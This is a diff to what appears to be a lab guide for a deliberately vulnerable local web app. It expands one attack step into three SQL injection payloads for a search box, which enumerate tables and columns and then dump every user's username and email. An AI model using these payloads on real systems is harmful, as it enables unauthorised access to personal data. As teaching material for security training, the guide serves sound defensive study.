@@ -174,10 +174,20 @@ Passwords must follow the rules in `password_policy.json`:
 **Steps:**
 1. Log in (use Attack 2 if needed)
 2. Go to the **System** screen at `http://127.0.0.1:5001/system`
-3. Paste this into the **search box**:
-   ```
-   ' UNION SELECT id, username, email, id FROM user --
-   ```
+3. Use the following payloads in the **search box** (execute them one by one):
+
+**List all tables in the database:**
+
+' UNION SELECT 1, name, 2, 3 FROM sqlite_master WHERE type='table' --
+
+**List all columns in the user table:**
+
+' UNION SELECT 1, name, type, 3 FROM pragma_table_info('user') --
+
+**Dump all usernames and emails:**
+
+' UNION SELECT id, username, email, id FROM user --
+
 4. Click **Search**
 
 **What happens:** the customer list now shows every registered user's **username and email address**. The UNION keyword merges the results of two queries — the original customer search and a second query that reads from the user table.
